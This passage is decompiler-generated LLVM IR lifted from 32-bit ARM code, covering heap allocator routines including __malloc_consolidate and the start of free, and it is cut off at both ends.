  br i1 %v7_13384, label %dec_label_pc_133b8, label %dec_label_pc_1338c

dec_label_pc_1338c:                               ; preds = %dec_label_pc_13374
  %v0_1338c = load i32, i32* @r4, align 4
  %v2_1338c = sub i32 %v0_1338c, %v1_13380
  store i32 %v2_1338c, i32* %r0.global-to-local, align 4
  %v9_1338c = icmp eq i32 %v0_1338c, %v1_13380
  store i1 %v9_1338c, i1* @cpsr_z, align 1
  br i1 %v9_1338c, label %dec_label_pc_133b8, label %dec_label_pc_13394

dec_label_pc_13394:                               ; preds = %dec_label_pc_1338c
  %v0_13394 = load i32, i32* @r5, align 4
  %v1_13394 = add i32 %v0_13394, 872
  %v2_13394 = inttoptr i32 %v1_13394 to i32*
  %v3_13394 = load i32, i32* %v2_13394, align 4
  %v1_13398 = load i32, i32* @r6, align 4
  %v2_13398 = sub i32 %v1_13398, %v2_1338c
  store i32 %v2_13398, i32* %r2.global-to-local, align 4
  %v1_1339c = add i32 %v0_13394, 44
  %v2_1339c = inttoptr i32 %v1_1339c to i32*
  %v3_1339c = load i32, i32* %v2_1339c, align 4
  store i32 %v3_1339c, i32* %r1.global-to-local, align 4
  %v2_133a0 = sub i32 %v3_13394, %v2_1338c
  %v1_133a4 = or i32 %v2_13398, 1
  store i32 %v1_133a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_133a0, i32* %v2_13394, align 4
  %v0_133b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_133b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_133b0 = add i32 %v1_133b0, 4
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  store i32 %v0_133b0, i32* %v3_133b0, align 4
  %v1_133c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133bc

dec_label_pc_133b8:                               ; preds = %dec_label_pc_13358, %dec_label_pc_1338c, %dec_label_pc_13374, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133bc

dec_label_pc_133bc:                               ; preds = %dec_label_pc_13394, %dec_label_pc_133b8
  %v1_133c4 = phi i32 [ %v1_133c4.pre, %dec_label_pc_13394 ], [ 0, %dec_label_pc_133b8 ]
  store i32 %v12_1331c, i32* @r7, align 4
  ret i32 %v1_133c4

; uselistorder directives
  uselistorder i1 %v7_13384, { 1, 0 }
  uselistorder i32 %v1_13380, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13324, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_133bc, { 1, 0 }
  uselistorder label %dec_label_pc_133b8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_133c8 = load i32, i32* @r4, align 4
  store i32 %v3_133c8, i32* %stack_var_-36, align 4
  %v0_133cc = load i32, i32* @r0, align 4
  %v1_133cc = inttoptr i32 %v0_133cc to i32*
  %v2_133cc = load i32, i32* %v1_133cc, align 4
  store i32 %v2_133cc, i32* %r3.global-to-local, align 4
  %v2_133d0 = icmp eq i32 %v2_133cc, 0
  store i32 %v0_133cc, i32* @r4, align 4
  br i1 %v2_133d0, label %dec_label_pc_13508.preheader, label %dec_label_pc_133e4

dec_label_pc_13508.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1351025 = add i32 %v0_133cc, 52
  store i32 %v1_1351025, i32* %r3.global-to-local, align 4
  %v2_1351826 = add i32 %v0_133cc, 60
  %v3_1351827 = inttoptr i32 %v2_1351826 to i32*
  store i32 %v1_1351025, i32* %v3_1351827, align 4
  %v0_1351c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_1351c29 = add i32 %v0_1351c28, 12
  %v3_1351c30 = inttoptr i32 %v2_1351c29 to i32*
  store i32 %v0_1351c28, i32* %v3_1351c30, align 4
  br label %dec_label_pc_13508.dec_label_pc_13508_crit_edge

dec_label_pc_133e4:                               ; preds = %entry
  %v1_133e4 = and i32 %v2_133cc, -3
  %v3_133e8 = udiv i32 %v2_133cc, 8
  store i32 %v3_133e8, i32* %r2.global-to-local, align 4
  store i32 %v1_133e4, i32* %v1_133cc, align 4
  %v0_133f0 = load i32, i32* @r0, align 4
  %v1_133f0 = add i32 %v0_133f0, -4
  store i32 %v1_133f0, i32* %r3.global-to-local, align 4
  %v1_133f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_133f4 = mul i32 %v1_133f4, 4
  %v5_133f4 = add i32 %v4_133f4, %v1_133f0
  store i32 %v5_133f4, i32* %sb.global-to-local, align 4
  %v1_133f8 = add i32 %v0_133f0, 52
  store i32 %v1_133f8, i32* %r7.global-to-local, align 4
  %v1_133fc = add i32 %v0_133f0, 4
  store i32 %v1_133fc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13404

dec_label_pc_13404:                               ; preds = %dec_label_pc_13500, %dec_label_pc_133e4
  %v1_134f810 = phi i32 [ %v1_134f8, %dec_label_pc_13500 ], [ %v5_133f4, %dec_label_pc_133e4 ]
  %v1_13410 = phi i32 [ %v1_13500, %dec_label_pc_13500 ], [ %v1_133fc, %dec_label_pc_133e4 ]
  %v1_13404 = inttoptr i32 %v1_13410 to i32*
  %v2_13404 = load i32, i32* %v1_13404, align 4
  store i32 %v2_13404, i32* %r1.global-to-local, align 4
  %v2_13408 = icmp eq i32 %v2_13404, 0
  br i1 %v2_13408, label %dec_label_pc_134f8, label %dec_label_pc_13410

dec_label_pc_13410:                               ; preds = %dec_label_pc_13404
  %v0_13410 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13410, i32* %v1_13404, align 4
  %v0_13414.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13414

dec_label_pc_13414:                               ; preds = %dec_label_pc_134ec, %dec_label_pc_13410
  %v0_13430 = phi i32 [ %v0_134ec, %dec_label_pc_134ec ], [ %v0_13414.pre, %dec_label_pc_13410 ]
  %v1_13414 = add i32 %v0_13430, 4
  %v2_13414 = inttoptr i32 %v1_13414 to i32*
  %v3_13414 = load i32, i32* %v2_13414, align 4
  store i32 %v3_13414, i32* %r3.global-to-local, align 4
  %v1_13418 = and i32 %v3_13414, -2
  store i32 %v1_13418, i32* %lr.global-to-local, align 4
  %v2_1341c = add i32 %v1_13418, %v0_13430
  store i32 %v2_1341c, i32* @r0, align 4
  %v1_13420 = urem i32 %v3_13414, 2
  %v2_13420 = icmp eq i32 %v1_13420, 0
  %v1_13424 = add i32 %v0_13430, 8
  %v2_13424 = inttoptr i32 %v1_13424 to i32*
  %v3_13424 = load i32, i32* %v2_13424, align 4
  store i32 %v3_13424, i32* %sl.global-to-local, align 4
  %v1_13428 = add i32 %v2_1341c, 4
  %v2_13428 = inttoptr i32 %v1_13428 to i32*
  %v3_13428 = load i32, i32* %v2_13428, align 4
  store i32 %v3_13428, i32* %r8.global-to-local, align 4
  br i1 %v2_13420, label %dec_label_pc_13430, label %dec_label_pc_13464

dec_label_pc_13430:                               ; preds = %dec_label_pc_13414
  %v1_13430 = inttoptr i32 %v0_13430 to i32*
  %v2_13430 = load i32, i32* %v1_13430, align 4
  store i32 %v2_13430, i32* %r5.global-to-local, align 4
  %v2_13434 = sub i32 %v0_13430, %v2_13430
  store i32 %v2_13434, i32* %r3.global-to-local, align 4
  %v1_13438 = add i32 %v2_13434, 8
  %v2_13438 = inttoptr i32 %v1_13438 to i32*
  %v3_13438 = load i32, i32* %v2_13438, align 4
  store i32 %v3_13438, i32* %ip.global-to-local, align 4
  %v1_1343c = add i32 %v3_13438, 12
  %v2_1343c = inttoptr i32 %v1_1343c to i32*
  %v3_1343c = load i32, i32* %v2_1343c, align 4
  store i32 %v3_1343c, i32* %r1.global-to-local, align 4
  %v9_13440 = icmp eq i32 %v3_1343c, %v2_13434
  %v1_13444 = add i32 %v2_13434, 12
  %v2_13444 = inttoptr i32 %v1_13444 to i32*
  %v3_13444 = load i32, i32* %v2_13444, align 4
  store i32 %v3_13444, i32* %r2.global-to-local, align 4
  br i1 %v9_13440, label %dec_label_pc_1344c, label %dec_label_pc_134a8

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13430
  %v1_1344c = add i32 %v3_13444, 8
  %v2_1344c = inttoptr i32 %v1_1344c to i32*
  %v3_1344c = load i32, i32* %v2_1344c, align 4
  store i32 %v3_1344c, i32* %r3.global-to-local, align 4
  %v9_13450 = icmp eq i32 %v3_1344c, %v2_13434
  br i1 %v9_13450, label %dec_label_pc_13458, label %dec_label_pc_134a8

dec_label_pc_13458:                               ; preds = %dec_label_pc_1344c
  store i32 %v3_13438, i32* %v2_1344c, align 4
  %v0_1345c = load i32, i32* %r2.global-to-local, align 4
  %v1_1345c = load i32, i32* %ip.global-to-local, align 4
  %v2_1345c = add i32 %v1_1345c, 12
  %v3_1345c = inttoptr i32 %v2_1345c to i32*
  store i32 %v0_1345c, i32* %v3_1345c, align 4
  %v0_13460 = load i32, i32* %lr.global-to-local, align 4
  %v1_13460 = load i32, i32* %r5.global-to-local, align 4
  %v2_13460 = add i32 %v1_13460, %v0_13460
  store i32 %v2_13460, i32* %lr.global-to-local, align 4
  %v0_13468.pre = load i32, i32* @r0, align 4
  %v0_1346c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13458
  %v0_134dc = phi i32 [ %v1_13418, %dec_label_pc_13414 ], [ %v2_13460, %dec_label_pc_13458 ]
  %v0_1346c = phi i32 [ %v3_13428, %dec_label_pc_13414 ], [ %v0_1346c.pre, %dec_label_pc_13458 ]
  %v1_13480 = phi i32 [ %v2_1341c, %dec_label_pc_13414 ], [ %v0_13468.pre, %dec_label_pc_13458 ]
  %v0_13464 = load i32, i32* @r4, align 4
  %v1_13464 = add i32 %v0_13464, 44
  %v2_13464 = inttoptr i32 %v1_13464 to i32*
  %v3_13464 = load i32, i32* %v2_13464, align 4
  store i32 %v3_13464, i32* %r3.global-to-local, align 4
  %v9_13468 = icmp eq i32 %v1_13480, %v3_13464
  %v1_1346c = and i32 %v0_1346c, -4
  store i32 %v1_1346c, i32* %r5.global-to-local, align 4
  br i1 %v9_13468, label %dec_label_pc_134dc, label %dec_label_pc_13474

dec_label_pc_13474:                               ; preds = %dec_label_pc_13464
  %v2_13474 = add i32 %v1_13480, %v1_1346c
  store i32 %v2_13474, i32* %r3.global-to-local, align 4
  %v1_13478 = add i32 %v2_13474, 4
  %v2_13478 = inttoptr i32 %v1_13478 to i32*
  %v3_13478 = load i32, i32* %v2_13478, align 4
  store i32 %v3_13478, i32* %r3.global-to-local, align 4
  %v1_1347c = urem i32 %v3_13478, 2
  %v2_1347c = icmp eq i32 %v1_1347c, 0
  %v2_13480 = add i32 %v1_13480, 4
  %v3_13480 = inttoptr i32 %v2_13480 to i32*
  store i32 %v1_1346c, i32* %v3_13480, align 4
  br i1 %v2_1347c, label %dec_label_pc_13488, label %dec_label_pc_13474.dec_label_pc_134b8_crit_edge

dec_label_pc_13474.dec_label_pc_134b8_crit_edge:  ; preds = %dec_label_pc_13474
  %v0_134bc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_134b8

dec_label_pc_13488:                               ; preds = %dec_label_pc_13474
  %v0_13488 = load i32, i32* @r0, align 4
  %v1_13488 = add i32 %v0_13488, 8
  %v2_13488 = inttoptr i32 %v1_13488 to i32*
  %v3_13488 = load i32, i32* %v2_13488, align 4
  store i32 %v3_13488, i32* %ip.global-to-local, align 4
  %v1_1348c = add i32 %v3_13488, 12
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  store i32 %v3_1348c, i32* %r3.global-to-local, align 4
  %v9_13490 = icmp eq i32 %v3_1348c, %v0_13488
  %v1_13494 = add i32 %v0_13488, 12
  %v2_13494 = inttoptr i32 %v1_13494 to i32*
  %v3_13494 = load i32, i32* %v2_13494, align 4
  store i32 %v3_13494, i32* %r2.global-to-local, align 4
  br i1 %v9_13490, label %dec_label_pc_1349c, label %dec_label_pc_134a8

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13488
  %v1_1349c = add i32 %v3_13494, 8
  %v2_1349c = inttoptr i32 %v1_1349c to i32*
  %v3_1349c = load i32, i32* %v2_1349c, align 4
  store i32 %v3_1349c, i32* %r3.global-to-local, align 4
  %v9_134a0 = icmp eq i32 %v3_1349c, %v0_13488
  br i1 %v9_134a0, label %dec_label_pc_134ac, label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13488, %dec_label_pc_1344c, %dec_label_pc_13430, %dec_label_pc_1349c
  %v0_134a8 = call i32 @abort()
  store i32 %v0_134a8, i32* @r0, align 4
  %v0_134ac.pre = load i32, i32* @ip, align 4
  %v1_134ac.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_134ac

dec_label_pc_134ac:                               ; preds = %dec_label_pc_1349c, %dec_label_pc_134a8
  %v1_134ac = phi i32 [ %v3_13494, %dec_label_pc_1349c ], [ %v1_134ac.pre, %dec_label_pc_134a8 ]
  %v0_134ac = phi i32 [ %v3_13488, %dec_label_pc_1349c ], [ %v0_134ac.pre, %dec_label_pc_134a8 ]
  %v2_134ac = add i32 %v1_134ac, 8
  %v3_134ac = inttoptr i32 %v2_134ac to i32*
  store i32 %v0_134ac, i32* %v3_134ac, align 4
  %v0_134b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_134b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_134b0 = add i32 %v1_134b0, 12
  %v3_134b0 = inttoptr i32 %v2_134b0 to i32*
  store i32 %v0_134b0, i32* %v3_134b0, align 4
  %v0_134b4 = load i32, i32* %lr.global-to-local, align 4
  %v1_134b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_134b4 = add i32 %v1_134b4, %v0_134b4
  store i32 %v2_134b4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_134b8

dec_label_pc_134b8:                               ; preds = %dec_label_pc_13474.dec_label_pc_134b8_crit_edge, %dec_label_pc_134ac
  %v0_134bc = phi i32 [ %v0_134bc.pre, %dec_label_pc_13474.dec_label_pc_134b8_crit_edge ], [ %v2_134b4, %dec_label_pc_134ac ]
  %v0_134b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_134b8 = add i32 %v0_134b8, 8
  %v2_134b8 = inttoptr i32 %v1_134b8 to i32*
  %v3_134b8 = load i32, i32* %v2_134b8, align 4
  store i32 %v3_134b8, i32* %r2.global-to-local, align 4
  %v1_134bc = or i32 %v0_134bc, 1
  store i32 %v1_134bc, i32* %r3.global-to-local, align 4
  %v0_134c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_134c0, i32* %v2_134b8, align 4
  %v0_134c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_134c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_134c4 = add i32 %v1_134c4, 12
  %v3_134c4 = inttoptr i32 %v2_134c4 to i32*
  store i32 %v0_134c4, i32* %v3_134c4, align 4
  %v0_134c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_134c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_134c8 = add i32 %v1_134c8, %v0_134c8
  %v4_134c8 = inttoptr i32 %v3_134c8 to i32*
  store i32 %v0_134c8, i32* %v4_134c8, align 4
  %v0_134cc = load i32, i32* %r3.global-to-local, align 4
  %v1_134cc = load i32, i32* %r1.global-to-local, align 4
  %v2_134cc = add i32 %v1_134cc, 4
  %v3_134cc = inttoptr i32 %v2_134cc to i32*
  store i32 %v0_134cc, i32* %v3_134cc, align 4
  %v0_134d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_134d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_134d0 = add i32 %v1_134d0, 8
  %v3_134d0 = inttoptr i32 %v2_134d0 to i32*
  store i32 %v0_134d0, i32* %v3_134d0, align 4
  %v0_134d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_134d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134d4 = add i32 %v1_134d4, 12
  %v3_134d4 = inttoptr i32 %v2_134d4 to i32*
  store i32 %v0_134d4, i32* %v3_134d4, align 4
  br label %dec_label_pc_134ec

dec_label_pc_134dc:                               ; preds = %dec_label_pc_13464
  %v2_134dc = add i32 %v1_1346c, %v0_134dc
  %v1_134e0 = or i32 %v2_134dc, 1
  store i32 %v1_134e0, i32* %r3.global-to-local, align 4
  %v1_134e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_134e4 = add i32 %v1_134e4, 4
  %v3_134e4 = inttoptr i32 %v2_134e4 to i32*
  store i32 %v1_134e0, i32* %v3_134e4, align 4
  %v0_134e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_134e8 = load i32, i32* @r4, align 4
  %v2_134e8 = add i32 %v1_134e8, 44
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  store i32 %v0_134e8, i32* %v3_134e8, align 4
  br label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134b8, %dec_label_pc_134dc
  %v0_134ec = load i32, i32* %sl.global-to-local, align 4
  %v2_134ec = icmp eq i32 %v0_134ec, 0
  store i32 %v0_134ec, i32* %r1.global-to-local, align 4
  br i1 %v2_134ec, label %dec_label_pc_134f8.loopexit, label %dec_label_pc_13414

dec_label_pc_134f8.loopexit:                      ; preds = %dec_label_pc_134ec
  %v0_134f8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_134f8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_134f8

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134f8.loopexit, %dec_label_pc_13404
  %v1_134f8 = phi i32 [ %v1_134f8.pre, %dec_label_pc_134f8.loopexit ], [ %v1_134f810, %dec_label_pc_13404 ]
  %v0_13500 = phi i32 [ %v0_134f8.pre, %dec_label_pc_134f8.loopexit ], [ %v1_13410, %dec_label_pc_13404 ]
  %v9_134f8 = icmp eq i32 %v0_13500, %v1_134f8
  br i1 %v9_134f8, label %dec_label_pc_13570, label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_134f8
  %v1_13500 = add i32 %v0_13500, 4
  store i32 %v1_13500, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13404

dec_label_pc_13508.dec_label_pc_13508_crit_edge:  ; preds = %dec_label_pc_13508.preheader, %dec_label_pc_13508.dec_label_pc_13508_crit_edge
  %v0_13508.pre = load i32, i32* @r4, align 4
  %v1_13508.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13508 = mul i32 %v1_13508.pre, 8
  %v5_13508 = add i32 %v4_13508, %v0_13508.pre
  %v1_1350c = add i32 %v1_13508.pre, 1
  store i32 %v1_1350c, i32* %r2.global-to-local, align 4
  %v1_13510 = add i32 %v5_13508, 44
  store i32 %v1_13510, i32* %r3.global-to-local, align 4
  %v2_13518 = add i32 %v5_13508, 52
  %v3_13518 = inttoptr i32 %v2_13518 to i32*
  store i32 %v1_13510, i32* %v3_13518, align 4
  %v0_1351c = load i32, i32* %r3.global-to-local, align 4
  %v2_1351c = add i32 %v0_1351c, 12
  %v3_1351c = inttoptr i32 %v2_1351c to i32*
  store i32 %v0_1351c, i32* %v3_1351c, align 4
  %v7_13520 = icmp sgt i32 %v1_1350c, 95
  br i1 %v7_13520, label %dec_label_pc_13524, label %dec_label_pc_13508.dec_label_pc_13508_crit_edge

dec_label_pc_13524:                               ; preds = %dec_label_pc_13508.dec_label_pc_13508_crit_edge
  %v0_13524 = load i32, i32* @r4, align 4
  %v1_13524 = inttoptr i32 %v0_13524 to i32*
  %v2_13524 = load i32, i32* %v1_13524, align 4
  store i32 %v2_13524, i32* %r2.global-to-local, align 4
  %v1_13528 = add i32 %v0_13524, 864
  %v2_13528 = inttoptr i32 %v1_13528 to i32*
  %v3_13528 = load i32, i32* %v2_13528, align 4
  %v1_13530 = urem i32 %v2_13524, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_13538 = or i32 %v3_13528, 1
  store i32 %v1_13538, i32* %r1.global-to-local, align 4
  %v1_1353c = or i32 %v1_13530, 72
  store i32 %v1_1353c, i32* %r2.global-to-local, align 4
  %v1_13540 = add i32 %v0_13524, 52
  store i32 %v1_13540, i32* %ip.global-to-local, align 4
  %v2_13544 = add i32 %v0_13524, 840
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  store i32 0, i32* %v3_13544, align 4
  store i32 ptrtoint (i32* @global_var_10000.59 to i32), i32* %r3.global-to-local, align 4
  %v0_1354c = load i32, i32* %r0.global-to-local, align 4
  %v1_1354c = load i32, i32* @r4, align 4
  %v2_1354c = add i32 %v1_1354c, 836
  %v3_1354c = inttoptr i32 %v2_1354c to i32*
  store i32 %v0_1354c, i32* %v3_1354c, align 4
  %v0_13550 = load i32, i32* %r0.global-to-local, align 4
  %v1_13550 = load i32, i32* @r4, align 4
  %v2_13550 = add i32 %v1_13550, 844
  %v3_13550 = inttoptr i32 %v2_13550 to i32*
  store i32 %v0_13550, i32* %v3_13550, align 4
  %v1_13554 = load i32, i32* @r4, align 4
  %v2_13554 = add i32 %v1_13554, 852
  %v3_13554 = inttoptr i32 %v2_13554 to i32*
  store i32 ptrtoint (i32* @global_var_10000.59 to i32), i32* %v3_13554, align 4
  %v1_13558 = load i32, i32* @r4, align 4
  %v2_13558 = add i32 %v1_13558, 864
  %v3_13558 = inttoptr i32 %v2_13558 to i32*
  store i32 %v1_13538, i32* %v3_13558, align 4
  %v1_1355c = load i32, i32* @r4, align 4
  %v2_1355c = inttoptr i32 %v1_1355c to i32*
  store i32 %v1_1353c, i32* %v2_1355c, align 4
  %v0_13560 = load i32, i32* %ip.global-to-local, align 4
  %v1_13560 = load i32, i32* @r4, align 4
  %v2_13560 = add i32 %v1_13560, 44
  %v3_13560 = inttoptr i32 %v2_13560 to i32*
  store i32 %v0_13560, i32* %v3_13560, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_13568 = call i32 @sysconf(i32 30, i32 %v1_13538, i32 %v1_1353c, i32 ptrtoint (i32* @global_var_10000.59 to i32))
  store i32 %v4_13568, i32* @r0, align 4
  %v1_1356c = load i32, i32* @r4, align 4
  %v2_1356c = add i32 %v1_1356c, 860
  %v3_1356c = inttoptr i32 %v2_1356c to i32*
  store i32 %v4_13568, i32* %v3_1356c, align 4
  br label %dec_label_pc_13570

dec_label_pc_13570:                               ; preds = %dec_label_pc_134f8, %dec_label_pc_13524
  %v2_13574 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13574, i32* @r4, align 4
  %v1_13578 = load i32, i32* @r0, align 4
  ret i32 %v1_13578

; uselistorder directives
  uselistorder i32 %v0_13524, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1351c, { 1, 0 }
  uselistorder i32 %v1_13500, { 1, 0 }
  uselistorder i32 %v0_134ec, { 0, 2, 1 }
  uselistorder i32 %v0_134c8, { 1, 0 }
  uselistorder i32 %v1_13418, { 1, 0, 2 }
  uselistorder i32 %v0_13430, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_133f0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 17 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 12, 6, 5, 2, 3, 4, 0, 10, 11, 8, 9, 7 }
  uselistorder label %dec_label_pc_13570, { 1, 0 }
  uselistorder label %dec_label_pc_13508.dec_label_pc_13508_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_134ec, { 1, 0 }
  uselistorder label %dec_label_pc_134b8, { 1, 0 }
  uselistorder label %dec_label_pc_134ac, { 1, 0 }
  uselistorder label %dec_label_pc_134a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13464, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1357c = load i32, i32* @r4, align 4
  %v6_1357c = load i32, i32* @r5, align 4
  %v9_1357c = load i32, i32* @r6, align 4
  %v12_1357c = load i32, i32* @r7, align 4
  %v18_1357c = load i32, i32* @lr, align 4
  %v0_13584 = load i32, i32* @r0, align 4
  store i32 %v0_13584, i32* @r6, align 4
  %v2_13584 = icmp eq i32 %v0_13584, 0
  %v2_13588 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r7, align 4
  br i1 %v2_13584, label %dec_label_pc_13790, label %dec_label_pc_13594

dec_label_pc_13594:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13598 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 108) to i32*), align 4
  store i32 %v4_13598, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13598, i32* %r2.global-to-local, align 4
  %v4_135a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 68) to i32*), align 4
  store i32 %v4_135a4, i32* %r1.global-to-local, align 4
  store i32 %v2_13588, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_135b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 112) to i32*), align 4
  store i32 %v4_135b0, i32* %ip.global-to-local, align 4
  store i32 79292, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_135b0)
  %v0_135bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_135bc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_135c4 = load i32, i32* @r7, align 4
  %v2_135c4 = add i32 %v0_135c4, 16
  %v3_135c4 = inttoptr i32 %v2_135c4 to i32*
  %v4_135c4 = load i32, i32* %v3_135c4, align 4
  store i32 %v4_135c4, i32* %ip.global-to-local, align 4
  store i32 79312, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_135c4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_135d4 = load i32, i32* @r7, align 4
  %v2_135d4 = add i32 %v0_135d4, 64
  %v3_135d4 = inttoptr i32 %v2_135d4 to i32*
  %v4_135d4 = load i32, i32* %v3_135d4, align 4
  store i32 %v4_135d4, i32* @lr, align 4
  %v0_135d8 = load i32, i32* @r6, align 4
  %v1_135d8 = add i32 %v0_135d8, -4
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* %r2.global-to-local, align 4
  %v1_135dc = inttoptr i32 %v4_135d4 to i32*
  %v2_135dc = load i32, i32* %v1_135dc, align 4
  store i32 %v2_135dc, i32* %r3.global-to-local, align 4
  %v1_135e0 = and i32 %v3_135d8, -4
  store i32 %v1_135e0, i32* %ip.global-to-local, align 4
  %v1_135e4 = add i32 %v0_135d8, -8
  store i32 %v1_135e4, i32* @r5, align 4
  store i32 %v1_135e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_135e0, %v2_135dc
  br i1 %tmp, label %dec_label_pc_13614, label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_13594
  %v1_135f4 = or i32 %v2_135dc, 3
  store i32 %v1_135f4, i32* %r3.global-to-local, align 4
  store i32 %v1_135f4, i32* %v1_135dc, align 4
  %v3_135f8 = load i32, i32* @lr, align 4
  %v4_135f8 = add i32 %v3_135f8, -8
  store i32 %v4_135f8, i32* %lr.global-to-local, align 4
  %v0_135fc = load i32, i32* %ip.global-to-local, align 4
  %v3_135fc = udiv i32 %v0_135fc, 8
  store i32 %v3_135fc, i32* %r1.global-to-local, align 4
  %v1_13600 = add i32 %v3_135f8, -4
  store i32 %v1_13600, i32* %r2.global-to-local, align 4
  %v4_13604 = mul nuw i32 %v3_135fc, 4
  %v5_13604 = add i32 %v4_13604, %v1_13600
  %v6_13604 = inttoptr i32 %v5_13604 to i32*
  %v7_13604 = load i32, i32* %v6_13604, align 4
